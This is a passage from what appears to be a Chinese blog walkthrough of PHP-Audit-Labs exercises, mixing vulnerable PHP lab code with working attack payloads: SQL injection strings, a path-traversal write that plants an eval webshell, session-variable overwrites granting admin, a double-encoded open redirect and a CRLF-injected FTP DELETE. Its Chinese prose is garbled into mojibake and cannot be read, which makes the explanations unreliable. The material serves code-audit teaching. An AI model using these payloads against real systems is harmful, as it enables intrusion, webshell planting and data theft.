class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>è¿™é‡Œé¦–å…ˆè¦è¾¾æˆsqlæ³¨å…¥,è‡ªç„¶æ¯”è¾ƒå…³å¿ƒæ˜¯å¦èƒ½é—­åˆå•å¼•å·ã€‚ä½†æ˜¯æ³¨æ„åˆ°,æ­¤å¤„çš„htmlentitiesä¸¥æ ¼è½¬ä¹‰äº†å•åŒå¼•å·ã€‚ä¸èƒ½è¿›è¡Œé—­åˆã€‚</p><p>ä½†æ˜¯ä¸ç”¨å¼•å·é—­åˆçš„å¦å¤–çš„åŠæ³•å°±æ˜¯éå¸¸å¸¸è§çš„<code>\</code>è¿›è¡Œè½¬ä¹‰ã€‚è¿™æ ·passwordçš„å€¼å°±å˜æˆå¯æ§çš„æ³¨å…¥ä½ç½®äº†ã€‚</p><p>æ¥ä¸‹æ¥æ¯”è¾ƒå…³å¿ƒçš„æ˜¯ä»£ç ä¸­å¯¹usernameä¸passwordå…³é”®å­—çš„è¿‡æ»¤ã€‚è¿™é‡Œè¿‡æ»¤å¾ˆç®€å•,å…¶ä»–ç›²æ³¨ä¹‹ç±»çš„æ–¹æ³•å½“ç„¶å¯ä»¥åšåˆ°ã€‚ä¸è¿‡è¿™é‡Œå¯ä»¥ç”¨åˆ°ä¸€ä¸ªå®¹æ˜“è¢«å¿˜è®°çš„å°æŠ€å·§:</p><blockquote><p>php.iniä¸­é»˜è®¤<br>å¦‚æœä»¥ POST ã€ GET æ–¹å¼ä¼ å…¥ç›¸åŒçš„å˜é‡ï¼Œé‚£ä¹ˆç”¨ REQUEST è·å–è¯¥å˜é‡çš„å€¼å°†ä¸º POST è¯¥å˜é‡çš„å€¼</p></blockquote><p>æ‰€ä»¥postæ•°æ®ä¼šè¦†ç›–æ‰getçš„æ•°æ®ã€‚æˆ‘ä»¬ç”¨postä¼ æ­£å¸¸çš„payloadã€å†ç”¨getæ‰§è¡Œsqlè¯­å¥å³å¯</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">get:username&#x3D;\&amp;password&#x3D;union select 1,flag,3,4 from ctf.users%23</span><br><span class="line"></span><br><span class="line">post: username&#x3D;1&amp;password&#x3D;2</span><br></pre></td></tr></table></figure><h2 id="Day13"><a href="#Day13" class="headerlink" title="Day13"></a>Day13</h2><h3 id="wafå¤±æ•ˆè¿›è¡Œsqlæ³¨å…¥"><a href="#wafå¤±æ•ˆè¿›è¡Œsqlæ³¨å…¥" class="headerlink" title="wafå¤±æ•ˆè¿›è¡Œsqlæ³¨å…¥"></a>wafå¤±æ•ˆè¿›è¡Œsqlæ³¨å…¥</h3><p><img src="/2020/04/27/PHP-Audit-Labs%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0/14.png" class="lazyload" data-srcset="14.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p><p>æœ¬é¢˜æ˜¾ç„¶ä»£ç ä¸­å­˜åœ¨sqlè¯­å¥æ‹¼æ¥ã€‚ä½†æ˜¯åªæœ‰ä¸€ä¸ªaddslashes,é™¤éæ˜¯äºŒæ¬¡æ³¨å…¥å¦åˆ™ä¸èƒ½åˆ©ç”¨ã€‚<br>ç„¶è€Œä»£ç ä¸­å´å‡ºç°äº†å¾ˆå¼±æ™ºçš„æ£€æŸ¥<code>substr()</code>,å…¶é•¿åº¦è¢«å®šæ­»ä¸º20.é‚£ä¹ˆæˆ‘ä»¬åªè¦å¡åœ¨è¿™ä¸ªç‚¹ä½¿ç”¨å•å¼•å·å°±èƒ½å¯¼è‡´è½¬ä¹‰å¤±æ•ˆäº†</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">user&#x3D;1234567890123456789&#39;&amp;passwd&#x3D;or 1&#x3D;1#</span><br></pre></td></tr></table></figure><p>åœ¨æŸCMSä¸­,å¯¹sqlè¯­å¥è¿›è¡Œäº†htmlentiteså¤„ç†ã€‚ä½†æ˜¯åŒæ—¶æ•°æ®åœ¨ä¼ å…¥å‰ä¼šè¿›è¡Œä¸€æ¬¡urldecodeã€‚æˆ‘ä»¬çŸ¥é“,åœ¨wafæ£€æµ‹åå†è¿›è¡Œè§£ç æ“ä½œæ— ç–‘æ˜¯å…·æœ‰å±å®³æ€§çš„ã€‚(æ¯”å¦‚json_deocdeå¦‚æœåœ¨wafæ£€æµ‹ä¹‹åçš„è¯,å°±èƒ½ç”¨unicodeç»•è¿‡ä»»æ„å­—ç¬¦waf)</p><h3 id="ç»ƒä¹ -12"><a href="#ç»ƒä¹ -12" class="headerlink" title="ç»ƒä¹ "></a>ç»ƒä¹ </h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//index.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">require</span> <span class="string">'db.inc.php'</span>;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">dhtmlspecialchars</span><span class="params">($string)</span> </span>&#123;</span><br><span class="line">      <span class="keyword">if</span> (is_array($string)) &#123;</span><br><span class="line">          <span class="keyword">foreach</span> ($string <span class="keyword">as</span> $key =&gt; $val) &#123;</span><br><span class="line">              $string[$key] = dhtmlspecialchars($val);</span><br><span class="line">          &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span> &#123;</span><br><span class="line">          $string = str_replace(<span class="keyword">array</span>(<span class="string">'&amp;'</span>, <span class="string">'"'</span>, <span class="string">'&lt;'</span>, <span class="string">'&gt;'</span>, <span class="string">'('</span>, <span class="string">')'</span>), <span class="keyword">array</span>(<span class="string">'&amp;amp;'</span>, <span class="string">'&amp;quot;'</span>, <span class="string">'&amp;lt;'</span>, <span class="string">'&amp;gt;'</span>, <span class="string">'ï¼ˆ'</span>, <span class="string">'ï¼‰'</span>), $string);</span><br><span class="line">          <span class="keyword">if</span> (strpos($string, <span class="string">'&amp;amp;#'</span>) !== <span class="keyword">false</span>) &#123;</span><br><span class="line">              $string = preg_replace(<span class="string">'/&amp;amp;((#(\d&#123;3,5&#125;|x[a-fA-F0-9]&#123;4&#125;));)/'</span>, <span class="string">'&amp;\\1'</span>, $string);</span><br><span class="line">          &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">return</span> $string;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">dowith_sql</span><span class="params">($str)</span> </span>&#123;</span><br><span class="line">      $check = preg_match(<span class="string">'/select|insert|update|delete|\'|\/\*|\*|\.\.\/|\.\/|union|into|load_file|outfile/is'</span>, $str);</span><br><span class="line">      <span class="keyword">if</span> ($check) &#123;</span><br><span class="line">          <span class="keyword">echo</span> <span class="string">"éæ³•å­—ç¬¦!"</span>;</span><br><span class="line">          <span class="keyword">exit</span>();</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">return</span> $str;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">// ç»è¿‡ç¬¬ä¸€ä¸ªwafå¤„ç†</span></span><br><span class="line">  <span class="keyword">foreach</span> ($_REQUEST <span class="keyword">as</span> $key =&gt; $value) &#123;</span><br><span class="line">      $_REQUEST[$key] = dowith_sql($value);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">// ç»è¿‡ç¬¬äºŒä¸ªWAFå¤„ç†</span></span><br><span class="line">  $request_uri = explode(<span class="string">"?"</span>, $_SERVER[<span class="string">'REQUEST_URI'</span>]);</span><br><span class="line">  <span class="keyword">if</span> (<span class="keyword">isset</span>($request_uri[<span class="number">1</span>])) &#123;</span><br><span class="line">      $rewrite_url = explode(<span class="string">"&amp;"</span>, $request_uri[<span class="number">1</span>]);</span><br><span class="line">      <span class="keyword">foreach</span> ($rewrite_url <span class="keyword">as</span> $key =&gt; $value) &#123;</span><br><span class="line">          $_value = explode(<span class="string">"="</span>, $value);</span><br><span class="line">          <span class="keyword">if</span> (<span class="keyword">isset</span>($_value[<span class="number">1</span>])) &#123;</span><br><span class="line">              $_REQUEST[$_value[<span class="number">0</span>]] = dhtmlspecialchars(addslashes($_value[<span class="number">1</span>]));</span><br><span class="line">          &#125;</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">// ä¸šåŠ¡å¤„ç†</span></span><br><span class="line">  <span class="keyword">if</span> (<span class="keyword">isset</span>($_REQUEST[<span class="string">'submit'</span>])) &#123;</span><br><span class="line">      $user_id = $_REQUEST[<span class="string">'i_d'</span>];</span><br><span class="line">      $sql = <span class="string">"select * from ctf.users where id=$user_id"</span>;</span><br><span class="line">      $result=mysql_query($sql);</span><br><span class="line">      <span class="keyword">while</span>($row = mysql_fetch_array($result))</span><br><span class="line">      &#123;</span><br><span class="line">          <span class="keyword">echo</span> <span class="string">"&lt;tr&gt;"</span>;</span><br><span class="line">          <span class="keyword">echo</span> <span class="string">"&lt;td&gt;"</span> . $row[<span class="string">'name'</span>] . <span class="string">"&lt;/td&gt;"</span>;</span><br><span class="line">          <span class="keyword">echo</span> <span class="string">"&lt;/tr&gt;"</span>;</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>è¿™ä¸ªç»ƒä¹ å¾ˆæœ‰è¥å…»ã€‚ç”¨åˆ°äº†å‡ ä¸ªphpçš„ç‰¹æ€§<br>1.ä¼ å…¥çš„éæ³•çš„ <code>$_GET</code> æ•°ç»„å‚æ•°å,PHPä¼šå°†ä»–ä»¬æ›¿æ¢æˆä¸‹åˆ’çº¿<br>2.ä¼ å…¥å¤šä¸ªç›¸åŒå‚æ•°æ—¶,phpåªä¼šæ¥å—æœ€åä¸€ä¸ª(ç±»ä¼¼jsäº†)<br>3.<code>$_SERVER[&#39;REQUEST_URI&#39;]</code>æ–¹å¼è·å¾—çš„å‚æ•°ï¼Œå¹¶ä¸ä¼šå¯¹å‚æ•°ä¸­çš„æŸäº›ç‰¹æ®Šå­—ç¬¦è¿›è¡Œæ›¿æ¢</p><p>æœ¬é¢˜ä»£ç ä¸­,<code>$_REQUEST</code>çš„æ•°æ®ä¼šç»è¿‡<code>dowith_sql</code>å¤„ç†ã€‚è€Œä¹‹åç¬¬äºŒä¸ªwafä¼šå¯¹<code>$_SERVER[&#39;REQUEST_URI&#39;]</code>è¿›è¡Œ<code>dhtmlspecialchars()</code>å¤„ç†.</p><p>é‚£ä¹ˆæ­¤å¤„æ€è·¯å¦‚ä¸‹,ä½¿ç”¨payload<br><code>i_d=padyload&amp;i.d=123</code><br>ç»è¿‡ç¬¬ä¸€æ¬¡wafæ—¶ï¼Œphpä¼šå°†å‚æ•°ä¸­çš„æŸäº›ç‰¹æ®Šç¬¦å·æ›¿æ¢ä¸ºä¸‹åˆ’çº¿ã€‚å› æ­¤ä¾¿å¾—åˆ°äº†ä¸¤ä¸ªi_d,å…¶ä¸­ä¸å«æ¶æ„ä»£ç çš„<code>i_d</code>å†…å®¹é€šè¿‡æ£€æŸ¥ã€‚<br>ç»è¿‡ç¬¬äºŒæ¬¡wafæ—¶,ç”±äºä»£ç æ˜¯é€šè¿‡ $_SERVER[â€˜REQUEST_URIâ€™] å–å‚æ•°.æ£€æŸ¥çš„å®é™…ä¸Šæ˜¯æˆ‘ä»¬åˆå§‹ä¼ å…¥çš„payloadã€‚è¿™é‡Œç”±äºæ˜¯æ•°å€¼å‹æ³¨å…¥,æ‰€ä»¥å¯ä»¥ç›´æ¥unionå¾—åˆ°flag</p><p>payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">submit&#x3D;&amp;i_d&#x3D;-1&#x2F;**&#x2F;union&#x2F;**&#x2F;select&#x2F;**&#x2F;1,flag,3,4&#x2F;**&#x2F;from&#x2F;**&#x2F;ctf.users&amp;i.d&#x3D;123</span><br></pre></td></tr></table></figure><h2 id="Day14"><a href="#Day14" class="headerlink" title="Day14"></a>Day14</h2><h3 id="å˜é‡è¦†ç›–-è·¯å¾„ç©¿è¶Š"><a href="#å˜é‡è¦†ç›–-è·¯å¾„ç©¿è¶Š" class="headerlink" title="å˜é‡è¦†ç›–+è·¯å¾„ç©¿è¶Š"></a>å˜é‡è¦†ç›–+è·¯å¾„ç©¿è¶Š</h3><p><img src="/2020/04/27/PHP-Audit-Labs%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0/15.png" class="lazyload" data-srcset="15.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p><p>è¿™é‡Œçš„ä»£ç åœ¨ææ„å‡½æ•°é‡Œæœ‰å†™æ–‡ä»¶çš„æ–¹æ³•ã€‚å› æ­¤åªè¦idå¯æ§å°±èƒ½æ§åˆ¶è·¯å¾„ã€‚åŒæ—¶çœ‹åˆ°æ„é€ å‡½æ•°é‡Œå­˜åœ¨å˜é‡è¦†ç›–ï¼Œé‚£ä¹ˆåˆ©ç”¨èµ·æ¥å°±ä¸éš¾äº†ã€‚<br>payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id&#x3D;..&#x2F;var&#x2F;www&#x2F;html&#x2F;shell.php&amp;shell&#x3D;&#39;,)%0a&lt;?&#x3D;eval($_REQUEST[byc]);?&gt;&#x2F;&#x2F;</span><br></pre></td></tr></table></figure><p>å› ä¸ºå®é™…ä¸Šå†™å…¥çš„å†…å®¹æ˜¯ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">array(</span><br><span class="line">    &#39;id&#39;&#x3D;&gt;&#39;..&#x2F;var&#x2F;www&#x2F;html&#x2F;shell.php&#39;,</span><br><span class="line">    &#39;lost&#39;&#x3D;&gt;0,</span><br><span class="line">    &#39;bought&#39;&#x3D;&gt;0,</span><br><span class="line">    &#39;shell&#39;&#x3D;&gt;&#39;\&#39;,)</span><br><span class="line">    &lt;?&#x3D;eval($_REQUEST[byc]);?&gt;&#x2F;&#x2F;&#39;,</span><br><span class="line">)</span><br></pre></td></tr></table></figure><p>æ‰€ä»¥éœ€è¦å…ˆé—­åˆ,æ¢è¡Œåå†™shellæ³¨é‡Šå³å¯ã€‚</p><p>æŸCMSä¸­ä¹Ÿå‡ºç°äº†ç±»ä¼¼çš„å˜é‡è¦†ç›–æ¼æ´ã€‚æ¯”å¦‚éœ€è¦adminæƒé™,è€Œadminæƒé™æ˜¯ç”±sessionæ•°ç»„çš„å€¼å†³å®šçš„ã€‚å› æ­¤å¯ä»¥ç›´æ¥<code>_SESSION[duomi_group_]=1&amp;_SESSION[duomi_admin_]=1</code>è¦†ç›–ã€‚<br>å½“ç„¶,å‰ææ˜¯å½“å‰çš„phpå¼€å¯äº†<code>session_start()</code></p><h2 id="Day15"><a href="#Day15" class="headerlink" title="Day15"></a>Day15</h2><h3 id="PHP-SELF"><a href="#PHP-SELF" class="headerlink" title="PHP_SELF"></a>PHP_SELF</h3><p><img src="/2020/04/27/PHP-Audit-Labs%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0/16.png" class="lazyload" data-srcset="16.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p><p>å…³äº<code>$_SERVER[&#39;PHP&#39;]</code>:<br><code>PHP_SELF</code>æŒ‡å½“å‰çš„é¡µé¢ç»å¯¹åœ°å€,å®ƒæ˜¯å¯ä»¥æ§åˆ¶çš„.</p><p>åŒæ—¶ä»£ç ä¸­è°ƒç”¨äº†ä¸€æ¬¡urldecode,åŠ ä¸Šæµè§ˆå™¨è‡ªå¸¦çš„ä¸€æ¬¡è§£ç ,å°±å¯ä»¥é€šè¿‡äºŒæ¬¡urlç¼–ç è¿›è¡Œå…³é”®å­—ç»•è¿‡<br><code>http://www.test.com/index.php/http:%252f%252fblog.dyboy.cn?redirect=test&amp;params=test123</code><br>æ­¤å¤„payloadå³å¯è¾¾æˆ302è·³è½¬</p><p><code>PHP_SELF</code>è¿™ä¸ªè€ƒç‚¹ä¹‹å‰zer0ptsçš„é¢˜ç›®ä¸­ä¹Ÿæœ‰å‡ºç°è¿‡</p><h3 id="ç»ƒä¹ -13"><a href="#ç»ƒä¹ -13" class="headerlink" title="ç»ƒä¹ "></a>ç»ƒä¹ </h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// index.php</span></span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="keyword">include</span> <span class="string">"./config.php"</span>;</span><br><span class="line"><span class="keyword">include</span> <span class="string">"./flag.php"</span>;</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">$black_list = <span class="string">"/admin|guest|limit|by|substr|mid|like|or|char|union|select|greatest|%00|\'|"</span>;</span><br><span class="line">$black_list .= <span class="string">"=|_| |in|&lt;|&gt;|-|chal|_|\.|\(\)|#|and|if|database|where|concat|insert|having|sleep/i"</span>;</span><br><span class="line"><span class="keyword">if</span>(preg_match($black_list, $_GET[<span class="string">'user'</span>])) <span class="keyword">exit</span>(<span class="string">":P"</span>); </span><br><span class="line"><span class="keyword">if</span>(preg_match($black_list, $_GET[<span class="string">'pwd'</span>])) <span class="keyword">exit</span>(<span class="string">":P"</span>); </span><br><span class="line"></span><br><span class="line">$query=<span class="string">"select user from users where user='$_GET[user]' and pwd='$_GET[pwd]'"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;h1&gt;query : &lt;strong&gt;&lt;b&gt;&#123;$query&#125;&lt;/b&gt;&lt;/strong&gt;&lt;br&gt;&lt;/h1&gt;"</span>;</span><br><span class="line">$result = $conn-&gt;query($query);</span><br><span class="line"><span class="keyword">if</span>($result-&gt;num_rows &gt; <span class="number">0</span>)&#123;</span><br><span class="line">    $row = $result-&gt;fetch_assoc();</span><br><span class="line">    <span class="keyword">if</span>($row[<span class="string">'user'</span>]) <span class="keyword">echo</span> <span class="string">"&lt;h2&gt;Welcome &#123;$row['user']&#125;&lt;/h2&gt;"</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$result = $conn-&gt;query(<span class="string">"select pwd from users where user='admin'"</span>);</span><br><span class="line"><span class="keyword">if</span>($result-&gt;num_rows &gt; <span class="number">0</span>)&#123;</span><br><span class="line">    $row = $result-&gt;fetch_assoc();</span><br><span class="line">    $admin_pass = $row[<span class="string">'pwd'</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(($admin_pass)&amp;&amp;($admin_pass === $_GET[<span class="string">'pwd'</span>]))&#123;</span><br><span class="line">    <span class="keyword">echo</span> $flag;</span><br><span class="line">&#125;</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>æ²¡å•¥æ„æ€â€¦è·Ÿä¹‹å‰æ ¡èµ›çš„å¥—è·¯é¢˜ä¸€æ ·çš„ã€‚<code>regexp</code>è¿›è¡Œæ³¨å…¥<code>;%00</code>æ¥æ³¨é‡Šã€‚</p><h2 id="Day16"><a href="#Day16" class="headerlink" title="Day16"></a>Day16</h2><h3 id="REQUEST"><a href="#REQUEST" class="headerlink" title="$_REQUEST"></a>$_REQUEST</h3><p><img src="/2020/04/27/PHP-Audit-Labs%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0/17.png" class="lazyload" data-srcset="17.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p><p>æœ¬é¢˜ä¸»è¦æ˜¯ä¸€ä¸ª<code>$_REQUEST</code>çš„ä¾‹å­ã€‚ä»é¢˜ç›®é€»è¾‘ä¸Šçœ‹,é¦–å…ˆå¯ä»¥çŸ¥é“æ˜¯è¿›è¡Œäº†ä¸€æ¬¡ftpçš„è¿æ¥,åŒæ—¶ç”¨<code>intval</code>æ¥è¯•å›¾å¤„ç†æˆ‘ä»¬çš„è¾“å…¥ã€‚çœ‹ä¼¼æ— æ³•ç»•è¿‡ã€‚ä½†æ˜¯å®é™…è¾“å‡ºä¸‹å°±ä¼šå‘ç°æœ‰è¹Šè··: <code>$_REQUEST</code>çš„å†…å®¹ä¸å—è¿‡æ»¤å‡½æ•°å½±å“ã€‚æ‰€ä»¥è™½ç„¶<code>$_REQUEST</code> å†…å®¹æ˜¯ä¸Šè¿°ä¸‰ä¸ªå…¨å±€å˜é‡çš„åˆé›†,ä½†å®é™…ä¸Šæ˜¯ä¸ä¼šå—å½±å“çš„ã€‚</p><p>payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?mode&#x3D;1%0a%0dDELETE%20test.file</span><br></pre></td></tr></table></figure><p>1å¯ä»¥è¾¾æˆmodeçš„åˆ¤æ–­ã€‚è€Œåç»­çš„æ•°æ®é€šè¿‡crlfè¢«å½“åšå‘½ä»¤æ‰§è¡Œã€‚åˆ é™¤äº†æ–‡ä»¶ã€‚</p><p>å› æ­¤,éœ€è¦æ³¨æ„<code>$_REQUEST</code>çš„ä½¿ç”¨ã€‚å‡å¦‚åªå¯¹<code>GET,POST,COOKIE</code>ä¸‰ç§è¿›è¡Œè¿‡æ»¤å´åœ¨ä»£ç ä¸­æ‹¼æ¥<code>REQUEST</code>æ˜¯ä¸å¯å–çš„ã€‚</p><h3 id="ç»ƒä¹ -14"><a href="#ç»ƒä¹ -14" class="headerlink" title="ç»ƒä¹ "></a>ç»ƒä¹ </h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// index.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check_inner_ip</span><span class="params">($url)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $match_result=preg_match(<span class="string">'/^(http|https)?:\/\/.*(\/)?.*$/'</span>,$url);</span><br><span class="line">    <span class="keyword">if</span> (!$match_result)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">'url fomat error1'</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">try</span>&#123;</span><br><span class="line">        $url_parse=parse_url($url);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">catch</span>(<span class="keyword">Exception</span> $e)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">'url fomat error2'</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    $hostname=$url_parse[<span class="string">'host'</span>];</span><br><span class="line">    $ip=gethostbyname($hostname);</span><br><span class="line">    $int_ip=ip2long($ip);</span><br><span class="line">    <span class="keyword">return</span> ip2long(<span class="string">'127.0.0.0'</span>)&gt;&gt;<span class="number">24</span> == $int_ip&gt;&gt;<span class="number">24</span> || ip2long(<span class="string">'10.0.0.0'</span>)&gt;&gt;<span class="number">24</span> == $int_ip&gt;&gt;<span class="number">24</span> || ip2long(<span class="string">'172.16.0.0'</span>)&gt;&gt;<span class="number">20</span> == $int_ip&gt;&gt;<span class="number">20</span> || ip2long(<span class="string">'192.168.0.0'</span>)&gt;&gt;<span class="number">16</span> == $int_ip&gt;&gt;<span class="number">16</span> || ip2long(<span class="string">'0.0.0.0'</span>)&gt;&gt;<span class="number">24</span> == $int_ip&gt;&gt;<span class="number">24</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">safe_request_url</span><span class="params">($url)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (check_inner_ip($url))&#123;</span><br><span class="line">        <span class="keyword">echo</span> $url.<span class="string">' is inner ip'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        $ch = curl_init();</span><br><span class="line">        curl_setopt($ch, CURLOPT_URL, $url);</span><br><span class="line">        curl_setopt($ch, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);</span><br><span class="line">        curl_setopt($ch, CURLOPT_HEADER, <span class="number">0</span>);</span><br><span class="line">        $output = curl_exec($ch);</span><br><span class="line">        $result_info = curl_getinfo($ch);</span><br><span class="line">        <span class="keyword">if</span> ($result_info[<span class="string">'redirect_url'</span>])&#123;</span><br><span class="line">            safe_request_url($result_info[<span class="string">'redirect_url'</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">        curl_close($ch);</span><br><span class="line">        var_dump($output);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$url = $_POST[<span class="string">'url'</span>];</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">empty</span>($url))&#123;</span><br><span class="line">    safe_request_url($url);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__file__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//flag in flag.php </span></span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span 